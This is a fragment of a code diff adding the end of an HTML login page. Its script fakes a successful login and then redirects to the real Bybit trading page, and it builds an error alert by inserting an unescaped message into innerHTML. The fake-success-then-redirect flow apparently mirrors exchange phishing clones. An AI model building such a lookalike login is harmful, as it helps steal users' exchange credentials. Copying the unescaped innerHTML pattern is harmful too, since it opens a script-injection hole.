+        }
+        
+        function showSuccessMessage() {
+            // Create and show success message
+            const successDiv = document.createElement('div');
+            successDiv.className = 'alert alert-success';
+            successDiv.innerHTML = `
+                <i class="fas fa-check-circle"></i>
+                <span>Login successful! Redirecting...</span>
+            `;
+            
+            const form = document.getElementById('login-form');
+            form.insertBefore(successDiv, form.firstChild);
+            
+            // Remove message after 3 seconds and simulate redirect
+            setTimeout(() => {
+                successDiv.remove();
+                // Simulate redirect to dashboard
+                window.location.href = 'https://www.bybit.com/app/trade/usdt/BTCUSDT';
+            }, 3000);
+        }
+        
+        function showErrorMessage(message) {
+            // Create and show error message
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'alert alert-error';
+            errorDiv.innerHTML = `
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>${message}</span>
+            `;
+            
+            const form = document.getElementById('login-form');
+            form.insertBefore(errorDiv, form.firstChild);
+            
+            // Remove message after 5 seconds
+            setTimeout(() => {
+                errorDiv.remove();
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
